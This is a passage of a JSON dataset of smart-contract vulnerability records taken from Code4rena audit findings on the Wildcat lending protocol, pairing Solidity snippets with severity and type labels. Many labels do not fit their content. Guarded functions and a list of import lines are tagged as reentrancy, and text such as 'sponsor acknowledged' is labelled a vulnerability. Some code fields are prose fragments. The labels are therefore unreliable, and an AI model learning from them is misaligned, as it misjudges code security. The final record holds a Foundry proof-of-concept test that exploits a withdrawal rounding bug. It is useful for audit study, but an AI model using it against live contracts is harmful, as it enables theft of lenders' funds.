    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "First, note that the protocol allows borrowers to set a reserve ratio that they must maintain to avoid being charged a delinquency fee. Now, see https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/access/MarketConstraintHooks.sol#L44-L45 uint16 internal constant MaximumReserveRatioBips = 10_000; From here we can see that the maximum acceptable value for this is `10_000`. Now when creating the market, this is called: https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/access/MarketConstraintHooks.sol#L136-L150",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 24,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.594,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function collectFees() external nonReentrant sphereXGuardExternal {\n    MarketState memory state = _getUpdatedState();\n    if (state.accruedProtocolFees == 0) revert_NullFeeAmount();\n\n    uint128 withdrawableFees = state.withdrawableProtocolFees(totalAssets());\n    if (withdrawableFees == 0) revert_InsufficientReservesForFeeWithdrawal();\n\n    state.accruedProtocolFees -= withdrawableFees;\n    asset.safeTransfer(feeRecipient, withdrawableFees);\n    _writeState(state);\n    emit_FeesCollected(withdrawableFees);\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "Proof of Concept",
    "description": "First, note that from the readMe, this has been stated: https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/README.md#L276 | [Blocklists](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#tokens-with-blocklists)                                                                | In scope    | Now, take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarket.sol#L125-L137 function collectFees() external nonReentrant sphereXGuardExternal { MarketState memory state = _getUpdatedState();",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.53,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "markdown\n| [Balance changes outside of transfers](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#balance-modifications-outside-of-transfers-rebasingairdrops) | In scope    |\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "First, per the readMe, we should assume rebasing tokens are in scope, see https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/README.md#L262 | [Balance changes outside of transfers](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#balance-modifications-outside-of-transfers-rebasingairdrops) | In scope    | Where as this integration is welcome as the WIldMarketTokens themselves are somewhat rebasing in nature, this then means that users could pay lesser APR, which is because if they are used as underlying assets for markets, when the borrower/market contracts hold these tokens while they are lent, the newly accrued tokens may either be credited to the borrower, or inside the market itself, which in our case would count as the borrower adding liquidity. And result in the borrower _needing_ to pay a lower Annual Percentage Rate (APR) than initially set.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.182,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function _getUpdatedState() internal returns (MarketState memory state) {\n    state = _state;\n    // Handle expired withdrawal batch\n    if (state.hasPendingExpiredBatch()) {\n      uint256 expiry = state.pendingWithdrawalExpiry;\n      // Only accrue interest if time has passed since last update.\n      // This will only be false if withdrawalBatchDuration is 0.\n      uint32 lastInterestAccruedTimestamp = state.lastInterestAccruedTimestamp;\n      if (expiry != lastInterestAccruedTimestamp) {\n        (uint256 baseInterestRay, uint256 delinquencyFeeRay, uint256 protocolFee) = state\n          .updateScaleFactorAndFees(\n            delinquencyFeeBips,\n            delinquencyGracePeriod,\n            expiry\n          );\n          //snip\n      }\n          //snip\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketBase.sol#L406-L465 function _getUpdatedState() internal returns (MarketState memory state) { state = _state; // Handle expired withdrawal batch if (state.hasPendingExpiredBatch()) {",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 21,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.779,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n\n  function releaseEscrow() public override {\n    if (!canReleaseEscrow()) revert CanNotReleaseEscrow();\n\n    uint256 amount = balance();\n    address _account = account;\n    address _asset = asset;\n\n    asset.safeTransfer(_account, amount);\n\n    emit EscrowReleased(_account, _asset, amount);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/WildcatSanctionsEscrow.sol#L33-L44 function releaseEscrow() public override { if (!canReleaseEscrow()) revert CanNotReleaseEscrow(); uint256 amount = balance(); address _account = account;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.306,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function executeWithdrawal(\n    address accountAddress,\n    uint32 expiry\n  ) public nonReentrant sphereXGuardExternal returns (uint256) {\n    MarketState memory state = _getUpdatedState();\n    // Use an obfuscated constant for the base calldata size to prevent solc\n    // function specialization.\n    uint256 normalizedAmountWithdrawn = _executeWithdrawal(\n      state,\n      accountAddress,\n      expiry,\n      _runtimeConstant(0x44)\n    );\n    // Update stored state\n    _writeState(state);\n    return normalizedAmountWithdrawn;\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketWithdrawals.sol#L194-L211 function executeWithdrawal( address accountAddress, uint32 expiry ) public nonReentrant sphereXGuardExternal returns (uint256) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.549,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\n  function executeWithdrawal(\n-    address accountAddress,\n    uint32 expiry\n  ) public nonReentrant sphereXGuardExternal returns (uint256) {\n    MarketState memory state = _getUpdatedState();\n    // Use an obfuscated constant for the base calldata size to prevent solc\n    // function specialization.\n    uint256 normalizedAmountWithdrawn = _executeWithdrawal(\n      state,\n-     accountAddress,\n+     msg.sender,\n      expiry,\n      _runtimeConstant(0x44)\n    );\n    // Update stored state\n    _writeState(state);\n    return normalizedAmountWithdrawn;\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Recommended Mitigation Steps",
    "description": "Apply some sort of access control to `WildcatMarketWithdrawals#executeWithdrawal()` by using `msg.sender` as the lender's address instead: function executeWithdrawal( -    address accountAddress, uint32 expiry ) public nonReentrant sphereXGuardExternal returns (uint256) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 21,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.564,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n\n  function setCredential(\n    LenderStatus memory status,\n    RoleProvider provider,\n    uint256 timestamp\n  ) internal pure {\n    // User is approved, update status with new expiry and last provider\n    status.lastApprovalTimestamp = uint32(timestamp);\n    status.lastProvider = provider.providerAddress();\n    status.canRefresh = provider.isPullProvider();\n  }\n\n  function unsetCredential(LenderStatus memory status) internal pure {\n    status.canRefresh = false;\n    status.lastApprovalTimestamp = 0;\n    status.lastProvider = address(0);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/types/LenderStatus.sol#L54-L70 function setCredential( LenderStatus memory status, RoleProvider provider, uint256 timestamp",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 19,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.556,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n  function transferFrom(\n    address from,\n    address to,\n    uint256 amount\n  ) external virtual nonReentrant sphereXGuardExternal returns (bool) {\n    uint256 allowed = allowance[from][msg.sender];\n\n    // Saves gas for unlimited approvals.\n    if (allowed != type(uint256).max) {\n      uint256 newAllowance = allowed - amount;\n      _approve(from, msg.sender, newAllowance);\n    }\n\n    _transfer(from, to, amount, 0x64);\n\n    return true;\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketToken.sol#L49-L66 function transferFrom( address from, address to, uint256 amount",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.457,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function transfer(\n    address to,\n    uint256 amount\n  ) external virtual nonReentrant sphereXGuardExternal returns (bool) {\n    _transfer(msg.sender, to, amount, 0x44);\n    return true;\n  }\n\n  function _transfer(address from, address to, uint256 amount, uint baseCalldataSize) internal virtual {\n    MarketState memory state = _getUpdatedState();\n    uint104 scaledAmount = state.scaleAmount(amount).toUint104();\n\n    if (scaledAmount == 0) revert_NullTransferAmount();\n\n    hooks.onTransfer(from, to, scaledAmount, state, baseCalldataSize);\n\n    Account memory fromAccount = _getAccount(from);\n    fromAccount.scaledBalance -= scaledAmount;\n    _accounts[from] = fromAccount;\n\n    Account memory toAccount = _getAccount(to);\n    toAccount.scaledBalance += scaledAmount;\n    _accounts[to] = toAccount;\n\n    _writeState(state);\n    emit_Transfer(from, to, amount);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "Protocol has both underlying  and market tokens. Lenders deposit underlying tokens and get market tokens, which earn interest. When they want to withdraw their assets, they will burn their market tokens and get the underlying tokens back with some interest. All of the internal accounting is made with these market tokens and they are tracked as scaled balances. Market tokens are minted and burned and these actions affect scaledTotalSupply. Market tokens can also be transferred between accounts like a regular ERC20 token. See https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketToken.sol#L41-L90 function transfer( address to, uint256 amount",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 29,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.881,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n\n  function totalAssets() public view returns (uint256) {\n    return asset.balanceOf(address(this));\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketBase.sol#L295-L300 function totalAssets() public view returns (uint256) { return asset.balanceOf(address(this)); } This function is used to get the total balance in underlying asset and it does this by querying the `balanceOf()` method, issue however is that not all ERC20 support the `balanceOf()`, for eg Aura stash tokens, which stalls adoption and make protocol unusable with these tokens.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.114,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nfunction deposit(uint256 amount) external virtual {\n  uint256 actualAmount = depositUpTo(amount);\n  // Remove the following check\n  // if (amount != actualAmount) { \n  //   revert MaxSupplyExceeded();\n  // }\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Recommended Mitigation Steps",
    "description": "Remove the redundant check in the `deposit()` function, as `depositUpTo()` already handles the maximum supply limit: function deposit(uint256 amount) external virtual { uint256 actualAmount = depositUpTo(amount); // Remove the following check // if (amount != actualAmount) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.219,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n  function closeMarket() external onlyBorrower nonReentrant sphereXGuardExternal {\n    MarketState memory state = _getUpdatedState();\n\n    if (state.isClosed) revert_MarketAlreadyClosed();\n\n    uint256 currentlyHeld = totalAssets();\n    uint256 totalDebts = state.totalDebts();\n    if (currentlyHeld < totalDebts) {\n      // Transfer remaining debts from borrower\n      uint256 remainingDebt = totalDebts - currentlyHeld;\n      _repay(state, remainingDebt, 0x04);\n      currentlyHeld += remainingDebt;\n    } else if (currentlyHeld > totalDebts) {\n      uint256 excessDebt = currentlyHeld - totalDebts;\n      // Transfer excess assets to borrower\n      asset.safeTransfer(borrower, excessDebt);\n      currentlyHeld -= excessDebt;\n    }\n    hooks.onCloseMarket(state);\n    state.annualInterestBips = 0;\n    state.isClosed = true;\n    state.reserveRatioBips = 10000;\n    // Ensures that delinquency fee doesn't increase scale factor further\n    // as doing so would mean last lender in market couldn't fully redeem\n    state.timeDelinquent = 0;\n\n    // Still track available liquidity in case of a rounding error\n    uint256 availableLiquidity = currentlyHeld -\n      (state.normalizedUnclaimedWithdrawals + state.accruedProtocolFees);\n\n    // If there is a pending withdrawal batch which is not fully paid off, set aside\n    // up to the available liquidity for that batch.\n    if (state.pendingWithdrawalExpiry != 0) {\n      uint32 expiry = state.pendingWithdrawalExpiry;\n      WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n      if (batch.scaledAmountBurned < batch.scaledTotalAmount) {\n        (, uint128 normalizedAmountPaid) = _applyWithdrawalBatchPayment(\n          batch,\n          state,\n          expiry,\n          availableLiquidity\n        );\n        availableLiquidity -= normalizedAmountPaid;\n        _withdrawalData.batches[expiry] = batch;\n      }\n    }\n\n    uint256 numBatches = _withdrawalData.unpaidBatches.length();\n    for (uint256 i; i < numBatches; i++) {\n      // Process the next unpaid batch using available liquidity\n      uint256 normalizedAmountPaid = _processUnpaidWithdrawalBatch(state, availableLiquidity);\n      // Reduce liquidity available to next batch\n      availableLiquidity -= normalizedAmountPaid;\n    }\n\n    if (state.scaledPendingWithdrawals != 0) {\n      revert_CloseMarketWithUnpaidWithdrawals();\n    }\n\n    _writeState(state);\n    emit_MarketClosed(block.timestamp);\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "Proof of Concept",
    "description": "First note that from the readMe, this has been stated: https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/README.md#L276 | [Blocklists](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#tokens-with-blocklists)                                                                | In scope    | Now, take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarket.sol#L226-L288 function closeMarket() external onlyBorrower nonReentrant sphereXGuardExternal { MarketState memory state = _getUpdatedState();",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 65,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function registerControllerFactory(address factory) external onlyOwner {\n    if (!_controllerFactories.add(factory)) {\n      revert ControllerFactoryAlreadyExists();\n    }\n    _addAllowedSenderOnChain(factory);\n    emit ControllerFactoryAdded(factory);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/WildcatArchController.sol#L245-L251 function registerControllerFactory(address factory) external onlyOwner { if (!_controllerFactories.add(factory)) { revert ControllerFactoryAlreadyExists(); }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.268,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function removeSanctionOverride(address account) public override {\n    sanctionOverrides[msg.sender][account] = false;\n    emit SanctionOverrideRemoved(msg.sender, account);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/WildcatSanctionsSentinel.sol#L104-L107 function removeSanctionOverride(address account) public override { sanctionOverrides[msg.sender][account] = false; emit SanctionOverrideRemoved(msg.sender, account); }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.189,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function closeMarket() external onlyBorrower nonReentrant sphereXGuardExternal {\n    MarketState memory state = _getUpdatedState();\n\n    if (state.isClosed) revert_MarketAlreadyClosed();\n\n    //snip\n    hooks.onCloseMarket(state);\n    state.annualInterestBips = 0;\n    state.isClosed = true;\n    state.reserveRatioBips = 10000;\n    // Ensures that delinquency fee doesn't increase scale factor further\n    // as doing so would mean last lender in market couldn't fully redeem\n    // ..snip\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "See https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarket.sol#L226-L288 function closeMarket() external onlyBorrower nonReentrant sphereXGuardExternal { MarketState memory state = _getUpdatedState(); if (state.isClosed) revert_MarketAlreadyClosed(); //snip",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 17,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.506,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nimport './libraries/LibERC20.sol';\nimport './interfaces/IWildcatArchController.sol';\nimport './libraries/LibStoredInitCode.sol';\nimport './libraries/MathUtils.sol';\nimport './ReentrancyGuard.sol';\nimport './interfaces/WildcatStructsAndEnums.sol';\nimport './access/IHooks.sol';\nimport './IHooksFactory.sol';\nimport './types/TransientBytesArray.sol';\nimport './spherex/SphereXProtectedRegisteredBase.sol';\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "Multiple instances in scope, for example take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/HooksFactory.sol#L4-L13 import './libraries/LibERC20.sol'; import './interfaces/IWildcatArchController.sol'; import './libraries/LibStoredInitCode.sol'; import './libraries/MathUtils.sol';",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.413,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "  /**\n   * @dev Saturation addition. Add `a` to `b` and return the result\n   *      if it is less than `maxValue` or `maxValue` if it overflows.\n   */\n  function satAdd(uint256 a, uint256 b, uint256 maxValue) internal pure returns (uint256 c) {\n    unchecked {\n      c = a + b;\n      return ternary(c < maxValue, c, maxValue);\n    }\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/types/RoleProvider.sol#L37-L42 function calculateExpiry( RoleProvider provider, uint256 timestamp ) internal pure returns (uint256) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.337,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\nThis function is used to know if the lender has a credential, issue however is that expired credentials would also return true for this check, considering the check here is against the ",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/types/LenderStatus.sol#L36-L38 function hasCredential(LenderStatus memory status) internal pure returns (bool) { return status.lastApprovalTimestamp > 0; } This function is used to know if the lender has a credential, issue however is that expired credentials would also return true for this check, considering the check here is against the `lastApprovalTimestamp` being more than `0`, but when granting the credential the `lastApprovalTimestamp` is set to non-zero.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.187,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nNow contracts are being compiled with versions higher than `0.8.20` see https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/types/TransientBytesArray.sol#L1-L5\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "Per the readMe protocol is to also deploy on multiple optimistic chains see:<br> https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/README.md#L254 | Chains the protocol will be deployed on | Ethereum, Base, Arbitrum, Polygon | Now contracts are being compiled with versions higher than `0.8.20` see https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/types/TransientBytesArray.sol#L1-L5 // SPDX-License-Identifier: MIT",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.205,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "sponsor acknowledged",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "1a. Label as one of the following:",
    "description": "- `sponsor confirmed`, meaning: \"Yes, this is a problem and we intend to fix it.\" - `sponsor disputed`, meaning either: \"We cannot duplicate this issue\" or \"We disagree that this is an issue at all.\" - `sponsor acknowledged`, meaning: \"Yes, technically the issue is correct, but we are not going to resolve it for xyz reasons.\" Add any necessary comments explaining your rationale for your evaluation of the issue. Note: Adding or changing labels other than those in this list will be automatically reverted by our bot, which will note the change in a comment on the issue.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.02,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function test_deadrosesxyzissue() external {\n    parameters.annualInterestBips = 3650;\n    _deposit(alice, 1e18);\n    _deposit(bob, 0.5e18);\n    address laurence = address(1337);\n    _deposit(laurence, 0.5e18);\n    fastForward(200 weeks);\n\n    vm.startPrank(borrower);\n    asset.approve(address(market), 10e18);\n    asset.mint(borrower, 10e18);\n\n    vm.stopPrank();\n    vm.prank(alice);\n    uint32 expiry = market.queueFullWithdrawal();       // alice queues large withdraw\n\n    vm.prank(borrower);\n    market.closeMarket();                               // market is closed\n\n    market.executeWithdrawal(alice, expiry);     // alice withdraws at the current rate\n\n    vm.startPrank(bob);\n    for (uint i; i < 10; i++) {\n      market.queueWithdrawal(1);        // bob does multiple small withdraw requests just so they round down the batch's overall rate\n    }\n    market.queueFullWithdrawal();\n    vm.stopPrank();\n    vm.prank(laurence);\n    market.queueFullWithdrawal();\n\n    market.executeWithdrawal(bob, expiry);     // bob can successfully withdraw all of his funds\n\n    vm.expectRevert();\n    market.executeWithdrawal(laurence, expiry);    // laurence cannot withdraw his funds. Scammer get scammed.\n\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "[[H-01] User could withdraw more than supposed to, forcing last user withdraw to fail](https://github.com/code-423n4/2024-08-wildcat-findings/issues/64)",
    "description": "*Submitted by [deadrxsezzz](https://github.com/code-423n4/2024-08-wildcat-findings/issues/64)* Within Wildcat, withdraw requests are put into batches. Users first queue their withdraws and whenever there's sufficient liquidity, they're filled at the current rate. Usually, withdraw requests are only executable after the expiry passes and then all users within the batch get a cut from the `batch.normalizedAmountPaid` proportional to the scaled amount they've requested a withdraw for. uint128 newTotalWithdrawn = uint128( MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount) );",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 38,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
